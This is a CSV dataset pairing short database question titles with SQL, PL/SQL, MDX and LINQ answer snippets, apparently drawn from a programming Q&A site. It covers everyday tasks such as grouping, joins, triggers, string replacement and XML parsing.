,Unnamed: 0,NL,Code
25607,15621,what is the performance impact on oracle index on float column?,"SQL> create table int_test( int_col number(38,0), fixed_col number(10,3) );

Table created.

SQL> insert into int_test
  2    select level, level/1000
  3      from dual
  4   connect by level <= 1000000;

1000000 rows created.

SQL> select sum(vsize(int_col)) int_col_total_size,
  2         sum(vsize(fixed_col)) fixed_col_total_size
  3    from int_test;

INT_COL_TOTAL_SIZE FIXED_COL_TOTAL_SIZE
------------------ --------------------
           3979802              4797983

SQL> ed
Wrote file afiedt.buf

  1  select count(*) int_larger_than_fixed
  2    from int_test
  3*  where vsize(int_col) > vsize(fixed_col)
SQL> /

INT_LARGER_THAN_FIXED
---------------------
                 8262

SQL> ed
Wrote file afiedt.buf

  1  select count(*) fixed_larger_than_int
  2    from int_test
  3*  where vsize(int_col) < vsize(fixed_col)
SQL> /

FIXED_LARGER_THAN_INT
---------------------
               826443
"
19056,25829,Map 2 columns to 2 rows in 1 column?,"SELECT stuff, sender_id
    , (SELECT name FROM table2 WHERE id = sender_id) AS sender_name
    , recipient_id
    , (SELECT name FROM table2 WHERE id = recipient_id) AS recipient_name
FROM table1;
"
21302,27468,Case statement with grouping,"SELECT TransactionNumber
    ,sum(CASE WHEN TypeId = 1 THEN Amount ELSE 0 END) AS Type1
    ,sum(CASE WHEN TypeId = 2 THEN Amount ELSE 0 END) AS Type2
    ,sum(CASE WHEN TypeId = 3 THEN Amount ELSE 0 END) AS Type3
    ,sum(CASE WHEN TypeId = 4 THEN Amount ELSE 0 END) AS Type4
    ,sum(CASE WHEN TypeId = 5 THEN Amount ELSE 0 END) AS Type5
FROM Transactions group by TransactionNumber;
"
18589,3311,Inserting multiple rows into a table based on another,"INSERT INTO Table2(Version, Form)
SELECT Version, x.v
FROM Table1
INNER JOIN (VALUES (1, 3), (2, 2), (3, 1)) AS x(i, v)
ON IIF(Table1.Indicator = 0, 3, Table1.Indicator) >= x.i
"
30724,34266,Alter Magento product codes in SQL database?,"UPDATE
     Products
SET
    product_code = RIGHT(CONCAT('00000000', product_code), 8)
"
36270,63304,How can I make a condition to evaluate that either two columns dont have null values in BIDS?,"ISNULL(state) || ISNULL(city)
"
3010,65302,PL SQL trigger to insert history record when a column is updated,"CREATE OR REPLACE TRIGGER trigger_name
  AFTER UPDATE ON table_name
  FOR EACH ROW
BEGIN
  IF( UPDATING( 'COLUMN1' ) )
  THEN
    INSERT INTO log_table( column_name, column_value )
      VALUES( 'COLUMN1', :new.column1 );
  END IF;

  IF( UPDATING( 'COLUMN2' ) )
  THEN
    INSERT INTO log_table( column_name, column_value )
      VALUES( 'COLUMN2', :new.column2 );
  END IF;

  <<repeat for all columns>>
END;
"
8228,1831,intersect and topcount and order function in MDX query,"with 
set [Best Cities in CY 2003/2004] as
    filter(
        intersect(
            topcount(
                [Customer].[Customer Geography].[City],
                10,
                (
                    [Measures].[Internet Sales Amount],
                    [Date].[Calendar].[Calendar Year].[CY 2003]
                )
            ),
            topcount(
                [Customer].[Customer Geography].[City],
                10,
                (
                    [Measures].[Internet Sales Amount],
                    [Date].[Calendar].[Calendar Year].[CY 2004]
                )
            )
        ),
        ([Measures].[Internet Sales Amount], [Date].[Calendar].[Calendar Year].[CY 2004])
        /
        ([Measures].[Internet Sales Amount], [Date].[Calendar].[Calendar Year].[CY 2003])
        - 1.0
        < -0.35
    )
Select [Measures].[Internet Sales Amount] on columns,
       [Best Cities in CY 2003/2004] on rows
From [Adventure Works]
Where 
{
    [Date].[Calendar].[Calendar Year].[CY 2003],
    [Date].[Calendar].[Calendar Year].[CY 2004]
}
"
3351,37253,Oracle SQL - calculate avg pay in department and select all above avg,"select name, department, pay, avergePay
from EMPLOYEE
join DEPARTMENT using (department_id)
join (
select department_id, avg(pay) averagePay
from EMPLOYEE
join DEPARTMENT using (department_id)
) temp using (department_id)
"
1882,32861,Case statement COUNT for THEN in (PostgreSQL) 9.3.11,"SELECT  house,
         accession_year,
         COUNT(CASE WHEN accession_year BETWEEN 1601 AND 1700 THEN name END) AS seventeenth,
         COUNT(CASE WHEN accession_year BETWEEN 1701 AND 1800 THEN name END) AS eighteenth,
         COUNT(CASE WHEN accession_year BETWEEN 1801 AND 1900 THEN name END) AS nineteenth,
         COUNT(CASE WHEN accession_year BETWEEN 1901 AND 2000 THEN name END) AS twentieth,
  FROM (
     SELECT house,name,TO_CHAR(accession, 'YYYY' ) AS accession_year
     FROM monarch
     WHERE house IS NOT NULL ) AS t
  GROUP BY house
  ;
"
22777,20924,Need help on this SQL,"select 
isnull(case when charindex(' ',ship,(charindex(' ',ship,1))+1) > 0 
     then substring(ship,1,charindex(' ',ship,1))+space(1)+replace(substring(ship,(charindex(' ',ship,1))+1,((charindex(' ',ship,(charindex(' ',ship,1))+1)) - (charindex(' ',ship,1)))),substring(ship,(charindex(' ',ship,1))+1,((charindex(' ',ship,(charindex(' ',ship,1))+1)) - (charindex(' ',ship,1)))),replicate('*',len(substring(ship,(charindex(' ',ship,1))+1,(charindex(' ',ship,(charindex(' ',ship,1))+1)) - (charindex(' ',ship,1))))))+space(1)+substring(ship,(charindex(' ',ship,(charindex(' ',ship,1))+1)),(len(ship)))
end,ship) ""Replace""
from 
outcomes
"
19276,4830,How do I remove an email domain value and add a new one in a column - mysql," UPDATE mytable
    set myfield = replace (myfield, '@test.comXYZ', 'domain.com')
"
38895,7280,Finding total number of rows of tables across multiple databases,"SELECT SUM(table_rows) FROM INFORMATION_SCHEMA.TABLES
WHERE table_name = 'company'
"
21688,73656,Find records with same data in multiple fields,"SELECT *
FROM
(
  SELECT s.*,
    IIf(s.DeptOne = ""Pack"", 1, 0) AS D1,
    IIf(s.DeptTwo = ""Pack"", 1, 0) AS D2,
    IIf(s.DeptThree = ""Pack"", 1, 0) AS D3,
    IIf(s.DeptFour = ""Pack"", 1, 0) AS D4,
    IIf(s.DeptFive = ""Pack"", 1, 0) AS D5,
    IIf(s.DeptSix = ""Pack"", 1, 0) AS D6,
    IIf(s.DeptSeven = ""Pack"", 1, 0) AS D7,
    IIf(s.DeptEight = ""Pack"", 1, 0) AS D8,
    IIf(s.DeptNine = ""Pack"", 1, 0) AS D9,
    IIf(s.DeptTen = ""Pack"", 1, 0) AS D10,
    IIf(s.DeptEleven = ""Pack"", 1, 0) AS D11,
    IIf(s.DeptTwelve = ""Pack"", 1, 0) AS D12,
    IIf(s.DeptThirteen = ""Pack"", 1, 0) AS D13,
    IIf(s.DeptFourteen = ""Pack"", 1, 0) AS D14,
    IIf(s.DeptFifteen = ""Pack"", 1, 0) AS D15,
    IIf(s.DeptSixteen = ""Pack"", 1, 0) AS D16,
    IIf(s.DeptSeventeen = ""Pack"", 1, 0) AS D17,
    IIf(s.DeptEightteen = ""Pack"", 1, 0) AS D18,
    IIf(s.DeptNineteen = ""Pack"", 1, 0) AS D19,
    IIf(s.DeptTwenty = ""Pack"", 1, 0) AS D20
FROM MyTable s
) m
WHERE (m.D1 + m.D2 + m.D3 + m.D4 + m.D5 + m.D6 + m.D7 + m.D8 + 
       m.D9 + m.D10 + m.D11 + m.D12 + m.D13 + m.D14 + m.D15 + 
       m.D16 + m.D17 + m.D18 + m.D19 + m.D20) > 1
"
35756,19040,Querying item that is NOT EQUAL in the second table,"Select A.Name, A.VAL1 AS VALUEA1, A.VAL2 AS VALUEB1 
From TableA as A, TableB As B
Where A.NAME = B.NAME AND A.VAL2 != B.VAL2
"
22943,59205,MySQL for replace with wildcard,"UPDATE table
SET Configuration = CONCAT(
      SUBSTR(Configuration, 1, LOCATE('<tag>', Configuration)+4),
      NEW_DATA,
      SUBSTR(Configuration, LOCATE('</tag>', Configuration)
    )
"
7367,17116,Combine Multiple Rows into One Row (One Column) when Using SQL,"  DECLARE @MyTable TABLE
  (
     ID     INT,
     NAME   VARCHAR(100),
     NUMBER INT
  )

INSERT INTO @MyTable
VALUES      (24,
             'infill',
             '20'),
            (25,
             'test1',
             '10'),
            (26,
             'test2',
             '30'),
            (27,
             'test5',
             '35'),
            (28,
             'test3',
             '40')

SELECT stuff((SELECT ',' + NAME + ' ' + CONVERT(VARCHAR(100), NUMBER)
              FROM   @MyTable
              WHERE  id IN ( 24, 26, 28 )
              FOR XML PATH('')), 1, 1, '') AS SERVICE 
"
14620,50254,Count value in output with normal rows,"select t.id,t.name,s.step_no,s.step_data,counts.count
from test t 
     join steps s ON t.id = s.testid
     join (select testid, count(*) as count 
           from steps 
           group by testid) counts ON t.id = counts.testid
"
23948,32727,Get single column each row difference in SQL Server (alternative of LEAD function),"WITH    rows AS
        (SELECT  Column1 ,ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) AS rn
         FROM   (
            SELECT 10 Column1 UNION
            SELECT 25 UNION
            SELECT 30 UNION
            SELECT 40
        )M)
SELECT 
--mp.Column1 ,
mc.Column1,
--mc.rn,
--mp.rn,
CAST(mc.Column1 AS float) - CAST(mp.Column1 AS float) EXPECTED_OUTPUT
FROM    rows mc
LEFT JOIN    rows mp
ON   mp.rn = mc.rn - 1;
"
3499,37276,Postgresql nested SELECT,"SELECT
  P.pid,
  G.gid,
  P.val
FROM
  Grid          AS G
INNER JOIN
  Points        AS P
    ON  P.val < g.max_val
    AND P.Val > g.min_val
"
13657,24758,Android SQL Database returns null a String field with data that is really large,"TwitterObjectFactory.getRawJSON(status);
"
8826,35728,Add 0 at beginning in SQL,"SELECT DISTINCT 
     Right('00'+LTRIM(SUBSTRING(CONVERT(varchar, RunDateTime, 100), 13, 2)),2) + 
     ':'
     + Right('00' + SUBSTRING(CONVERT(varchar, RunDateTime, 100), 16, 2),2) + ' '
     + SUBSTRING(CONVERT(varchar, RunDateTime, 100), 18, 2) AS DistinctDate
FROM TestDates
"
16231,55077,Database game messaging schema,"FRIEND  -- The local user's own tag should go in here too.
( user_id
, current_gamer_tag
, last_update_timestamp
)

GAME
( game_id
, game_name  -- No timestamp here because the name doesn't change?
)

MESSAGE
( message_id  -- If you make this a GUID you can use it for synching with the server.
, sending_user_id -- FK to FRIEND
, receiving_user_id -- Also FK to FRIEND
, timestamp 
, content
)
"
15957,11037,MySQL using Inner joins on an alias of a calculated column,"SELECT User.id, 10*10 as distance 
FROM USERS 
INNER JOIN 
( 
    SELECT Location.user_id, 
    min(10 * 10) as mindistance 
    FROM Location 
    GROUP BY Location.user_id 
 ) L ON User.id = Location.user_id AND L.mindistance =10*10
"
28864,65709,How to select multiple results for a single row - MySQL,"   SELECT g.id, g.name, g.desc, GROUP_CONCAT(P.name) AS platforms
    from game g
    JOIN game_platform gp ON gp.game_id = g.id
    JOIN platform P ON gp.platform_id = p.id
    GROUP BY g.id, g.name, g.desc
"
35312,21443,sum two rows in a table,"select companyname, sum(shares) as shares
from companyshares
group by companyname
"
25478,52205,MySql Group by column y and return column with lowest value in column x,"SET @prevMail = '', @rownum=0;
SELECT b.mail, b.time, b.hits 
FROM (
    SELECT  
    a.mail,
    a.time,
    a.hits,
    CASE WHEN @prevMail = a.mail THEN @rownum :=@rownum+1 ELSE @rownum :=1 END AS rowNum,
    @prevMail:=a.mail
    FROM (
        SELECT mail, time, SUM(hits) AS hits
        FROM tablename 
        GROUP BY mail, time
        ORDER BY mail, time, SUM(hits) ASC
    ) AS a
) AS b
WHERE b.rowNum <= 10;
"
34872,36753,SQL: count all tasks that belong to a user inside each project,"SELECT  Projects.ID, Projects.Name, COUNT(Tasks.ProjectID) 
FROM    Projects  
        LEFT JOIN Tasks 
            ON Tasks.ProjectID = Projects.ID AND
                Assignee=1
GROUP   BY Projects.ID;
"
39273,57361,Multiple counts in a single query,"select 
  custsegment,
  count(distinct clid) as UniqCalls,
  count(case when disconnectflag = 'IVR' then 1 else null end) as IvrCalls,
  -- sum(case when disconnectflag = 'IVR' then 1 else 0 end) as IvrCalls,
  count('x') as TotalCalls
from call_log
where enteredon = '16-JUL-13'
group by
  custsegment
"
6803,58842,SQLite scripting with objective C,"NSString *sql = [NSString stringWithFormat:@""SELECT * FROM %@"",self.databaseName];
const char *sqlStatement = [sql UTF8String];
"
24928,21934,For Loop With Object Table?,"for x in (select value(t) v from person_obj_table t where lastName = 'Smith') loop
  dbms_output.put_line(x.v.get_fullName);
end loop;
"
23533,48425,How do you update a field if it is null in MySQL?,"update tablename
set    size = 0
where  size is null;
"
10060,55761,access: how to detect with VBA whether a query is opened?," If SysCmd(acSysCmdGetObjectState, acQuery, ""QueryName"") = acObjStateOpen Then
"
25672,73052,Oracle split text into multiple rows,"WITH yourtable AS    (SELECT REPLACE('aaaaaa. fgdfg.' ||chr(10)||           
                        'bbbbbbbbbbbbbb ccccccccc  ' ||chr(13)|| 
                        'dddddd ddd dddddddddddd,' ||chr(10)||
                        'asdasdasdll  ' ||chr(13)||
                        'sssss '||chr(10),chr(13),chr(10)) AS astr FROM DUAL)
SELECT REGEXP_SUBSTR ( astr, '[^' ||chr(10)||']+', 1, LEVEL) data   FROM yourtable   
CONNECT BY LEVEL <= LENGTH(astr) - LENGTH(REPLACE(astr, chr(10))) + 1
"
23913,3575,Find the lastest qualifying row for each key,"SELECT DISTINCT ON (id_chef)
       id_chantier, id_chef
FROM   tbl
WHERE  date_fin IS NOT NULL
ORDER  BY id_chef, date_deb DESC NULLS LAST;
"
35712,63839,How to replace a substring before and after a specific character in SQL Server?,"declare @TSQL varchar(100)
declare @R varchar(100)
SET @TSQL = 'this is test string [this text may vary] other text'
SET @R = 'MySubstitute'
Select Left(@TSQL,Charindex('[',@TSQL)-1) + @R + RIGHT(@TSQL,Charindex(']',REVERSE(@TSQL))-1)
"
33120,50055,SQL Query over 5 tables,"SELECT c.client_id, c.name, p.product_id, p.product_name, sum(op.quantity) as product_quantity
FROM Clients AS c
JOIN User AS u ON u.client_id = c.client_id
JOIN Orders AS o ON o.user_id = u.user_id
JOIN OrderPos AS op ON op.order_id = o.order_id
JOIN Products AS p ON p.product_id = op.product_id
GROUP BY c.client_id, c.name, p.product_id, p.product_name;
"
16338,49217,directory paths in mySQL,"UPDATE linksUpdates

 SET newTarget = (CASE 

  WHEN hitMissed = '/dir/dir/misLink1'         THEN 'dir/home' 
  WHEN hitMissed = '/dir/dir/misLink2'         THEN 'photos' 
  WHEN hitMissed = '/dir/dir/anotherBadLink'   THEN 'dir/home' 
  END)
 WHERE misdirect IN (
   '/dir/dir/misLink1',
   '/dir/dir/misLink2',
   '/dir/dir/anotherBadLink'
       )
"
11512,75110,SQL select depending on last access date,"ID int NOT NULL,
last_modified datetime NOT NULL
"
26234,44361,PostgreSQL list companies and rank by sales,"SELECT
    ""public"".companies.""name"", 
     rank() OVER (PARTITION BY sales.companies ORDER BY sales.lifetime) As ""Lifetime Rank"",
     rank() OVER (PARTITION BY sales.companies ORDER BY sales.month As ""One Month""

FROM companies LEFT JOIN 
   (
    SELECT
        SUM(grand_total) As Lifetime,
        SUM(CASE WHEN i.month = <the month of report>, grand_total, 0) As Month
    FROM
        invoices i 
    GROUP BY company_id
   ) sales
ON companies.company_id = sales.company_id
"
22199,72217,mysql query with date comparison,"SELECT a.invoiceno,
       a.invoicerefno,
       a.invoicedate,
       c.companyname,
       a.grandtotal,
       a.twempname,
       itemdescription,
       quantity
FROM twsql_twalldata.t_invoicedet a
INNER JOIN twsql_twalldata.t_salesinv_items b ON a.invoiceno=b.invoiceno
INNER JOIN twsql_twalldata.t_customerdet c ON a.customercode=c.customercode
WHERE a.twempname NOT LIKE '%Auto%' AND 
      (itemdescription LIKE '%AMC%' OR itemdescription LIKE '%annual maintenance contract%') AND 
       invoicecancelled=0 AND DATE(a.invoicedate) > DATE('2012-04-01');
"
15069,23211,oracle 11g PLSQL append xml document as child to another xml document,"declare 
  doc DBMS_XMLDOM.DOMDocument;
  root dbms_xmldom.DOMNode;
  toto_node dbms_xmldom.DOMNode;
  v_xml xmltype := xmltype('<a><b>bbbb</b><c>ccccc</c></a>') ;
  childDoc  DBMS_XMLDOM.DOMDocument;
  childDocElement   DBMS_XMLDOM.DOMELEMENT;
begin 
doc := DBMS_XMLDOM.newDOMDocument;

DBMS_XMLDOM.setVersion(doc, '1.0');
DBMS_XMLDOM.setcharset(doc, 'ISO-8859-15');
root := DBMS_XMLDOM.makeNode(doc);
toto_node := DBMS_XMLDOM.appendChild(root, DBMS_XMLDOM.makeNode(DBMS_XMLDOM.createElement(doc, 'toto1')));
childDoc  := DBMS_XMLDOM.NEWDOMDOCUMENT(v_xml);
childDocElement      := DBMS_XMLDOM.getDocumentElement(childDoc);
childDocElement      := DBMS_XMLDOM.makeElement(DBMS_XMLDOM.importNode(doc,DBMS_XMLDOM.makeNode(childDocElement),TRUE));

root := DBMS_XMLDOM.appendChild(toto_node,DBMS_XMLDOM.makeNode(childDocElement));
dbms_output.put_line(DBMS_XMLDOM.GETXMLTYPE(doc).getClobVal());
end; 
"
2246,19338,"WHERE col1,col2 IN (...) [SQL subquery using composite primary key]","sqlite> create table foo (a,b,c);
sqlite> create table bar (x,y);
sqlite> select * from foo where exists (select 1 from bar where foo.a = bar.x and foo.b = bar.y);
"
13811,63693,Oracle SQL Select Statement Calculations,"select 
  task_name, 
  to_char(ses_start, 'DD-MON-RR') DATE,
  to_char(ses_start,'HH:MI PM') START, 
  to_char(ses_end, 'HH:MI PM') END,
  round((ses_end - ses_start) * 24, 2) DURATION_IN_HOUR
...
"
7276,34190,oracle sql - How to I escape the result text,"select replace(field1, '''', '''''') from test
"
8765,43929,how to update syscolumns of a view after alter table - T-SQL?,"create table Test ( n1 decimal(12,4) )
go
create view VTest as Select * from Test;
go
sp_help VTest
go
alter table Test alter column n1 decimal(12,2)
EXEC sp_refreshview  VTest
go
sp_help VTest
"
29726,73726,Select highest season and episode (mysql),"SELECT * FROM tablename WHERE series = 1 ORDER BY season DESC, episode DESC LIMIT 1;
"
39763,18853,"basic sql : selecting the same column multiple times in one query, when each occurrence is dependent on different where clause","SELECT
(SELECT x FROM table WHERE y=1) AS x1,
(SELECT x FROM table WHERE y=2) AS x2,
(SELECT x FROM table WHERE y=3) AS x3
"
25631,4247,How can I order by a date in string format properly?,"SELECT CONVERT(varchar(10), create_date, 101) as 'Date', COUNT(*) as 'Record Count',
FROM the_table
GROUP BY CONVERT(varchar(10), create_date, 101)
ORDER BY MIN(create_date) desc
"
16633,23850,Insert a value/Row in a View,"create view yourview2
as
select 0 as ""Element No"", 'Pie' as Details , 1000 as UniqueID
union all 
select [Element No], Details, UniqueID
from yourview
"
32392,52001,How to check if a trigger is invalid?,"SELECT *
FROM   ALL_OBJECTS
WHERE  OBJECT_NAME = trigger_name
AND    OBJECT_TYPE = 'TRIGGER'
AND    STATUS <> 'VALID'
"
36532,52805,SQL Server: How to use XML input for Update / Set statement,"UPDATE A
SET    title = b.title,
       summary = b.summary,
       post = b.post,
       departmentID = b.departmentID
FROM   LogTable A
       JOIN (SELECT title=[Xml_Tab].[Cols].value('(title)[1]', 'nvarchar(100)'),
                    summary=[Xml_Tab].[Cols].value('(summary)[1]', 'nvarchar(500)'),
                    post=[Xml_Tab].[Cols].value('(post)[1]', 'nvarchar(max)'),
                    departmentID=[Xml_Tab].[Cols].value('(departmentID)[1]', 'int'),
                    PostID=[Xml_Tab].[Cols].value('(postID)[1]', 'int')
             FROM   @xmlMain.nodes('/root') AS [Xml_Tab]([Cols]) ) B
         ON a.postID = b.postID 
"
4816,53552,What host name in different database?,"mysql> show variables like 'hostname';
"
31108,36379,teradata - volatile table,"abort;
 *** ABORT signal received.
 *** Warning: Canceling the rest of the output.
 BTEQ -- Enter your SQL request or BTEQ command:
"
34085,60298,3 table Linq Query,"from pc in ProductCategories
let photo = pc.Products.SelectMany(p => p.Photos).FirstOrDefault()
select new {pc, photo};
"
25955,18270,Can I execute several WHERE LIMIT statements in one query?,"SELECT *
FROM  (
   SELECT *, row_number() OVER (PARTITION BY year ORDER BY total DESC) AS rn
   FROM   tbl
   ) sub
WHERE rn < 4
"
37841,13391,MySql Select data from SubQuery when master query has groupby clause,"select
    mysub.count, 
    nr.`networkid`
from 
    `networks` as nr,

(select 
    count(`ipaddress`) as count,
    `networkid`
from 
    `users`
where 
    `networkid`
in (
    select 
        `networkid`
    from 
        `networks`
   )
group by 
    `networkid`) as mysub
    where nr.`networkid` = mysub.`networkid`
    group by nr.`networkid` 
"
31419,25447,SQL Select Statement Where,"Select * from Event 
Where 
   (
        ((@personId is null) OR (PresenterId =@personId ))
        and 
        ((@personId  is null) OR (AuthorId = @personId))
        AND 
        (@filter = 'PandAOnly' or @filter = 'AllP' or @filter = 'AllA')
    )
OR 
  (
       (PresenterId = @personId 
        Or
        AuthorId = @personId )
    AND (@filter = 'All')
  )
OR 
  (
       PresenterId = @personId 
       and
       AuthorId <> @personId 
       and 
       @fitler = 'POnly'
  )
OR 
 (
        AuthorId = @personId 
        and 
        PresenterId <> @personId 
       and 
       @fitler = 'AOnly'
 )
"
24993,28041,Count(Distinct FieldName) in access query,"select BrandID, sum(orders), sum(models)
from (
    select BrandID, count(OrderID) orders, 0 models
    from (
        select distinct BrandID, OrderID
        from ordertable
        where Trunc(Pur_Date) between '01-Feb-2015' and '09-Feb-2015'
    ) x1
    group by BrandID
    union all
    select BrandID, 0 orders, count(ModelID) models
    from (
        select distinct BrandID, ModelID
        from ordertable
        where Trunc(Pur_Date) between '01-Feb-2015' and '09-Feb-2015'
    ) x2
    group by BrandID
) o
group by BrandID
"
22940,46550,Can we specify degree of parallelism dynamically?,"DECLARE
   degree varchar2(1); 
BEGIN 
   select value-2 
     INTO degree 
     from v$parameter
    where name='cpu_count';              

   EXECUTE IMMEDIATE('INSERT /*+ APPEND PARALLEL (tst, '||degree||') */ '||
                     '  INTO test_table tst ( '||
                     '       **************  '||
                     '       **************  '||
                     '       **************  '||
                     '  ) '||
                     'SELECT /*+  PARALLEL (a, '||degree||') */ '||
                     '       DISTINCT '||
                     '       ************** '||
                     '       ************** '||
                     '       ************** '||
                     '  FROM src_table a');
END; 
"
39354,41867,Sql iteration over XML,"declare @xml xml = 
'<Master>
   <UserIds>
       <id>1</id>
       <id>2</id>
       <id>3</id>
       <id>4</id>
  </UserIds>
</Master>
'

insert into YourTable(ID)
select T.N.value('.', 'int')
from @xml.nodes('/Master/UserIds/id') as T(N)
"
34323,2147,Select count multiple fields within time range - MYSQL,"SELECT
    MIN(date),
    SUM(count),
    SUM(fb_user_count),
    SUM(email_user_count)
FROM visit
GROUP BY WEEK(date, 1); -- First day is Monday

SELECT
    CONCAT(YEAR(date), '-', MONTH(date)),
    SUM(count),
    SUM(fb_user_count),
    SUM(email_user_count)
FROM visit
GROUP BY YEAR(date), MONTH(date);
"
1780,24080,SQL DELETE with JOIN another table on multiple conditions for WHERE NULL,"DELETE s                    -- << HERE: s (alias of slaveTable )
FROM   slaveTable AS s
LEFT JOIN 
       masterTable AS m 
ON   ( s.key1 = m.key1
AND    s.key2 = m.key2 )
WHERE  m.key1 IS NULL
"
8344,12836,How to get data out of a database where the saved date is greater than another date + 1 week,"SELECT * FROM foo WHERE update_date > DATE_ADD(publish_date, INTERVAL 1 WEEK)
"
